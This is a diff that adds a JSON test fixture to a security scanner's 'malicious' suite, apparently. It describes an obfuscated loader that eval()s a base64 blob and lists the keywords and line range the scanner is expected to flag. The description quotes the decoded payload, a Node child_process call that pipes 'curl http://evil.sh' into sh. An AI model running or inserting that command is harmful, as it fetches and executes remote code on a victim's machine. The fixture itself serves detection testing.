@@ -1,0 +1,17 @@
+{
+  "description": "A base64 blob is decoded at runtime and passed to eval(). The decoded payload is `require('child_process').exec('curl http://evil.sh | sh')`. Obfuscated dynamic execution of a remote shell payload — the encoding exists only to hide the call from a reader and from scanners.",
+  "kind": "positive",
+  "suite": "malicious",
+  "profiles": ["malicious"],
+  "force_profiles": true,
+  "expected": [
+    {
+      "file": "loader.js",
+      "line": 5,
+      "end_line": 6,
+      "min_severity": "warning",
+      "keywords": ["obfuscat", "eval", "base64", "decode", "payload", "child_process", "exec", "dynamic"],
+      "note": "base64 blob (line 5) decoded and eval'd (line 6)"
+    }
+  ]
+}
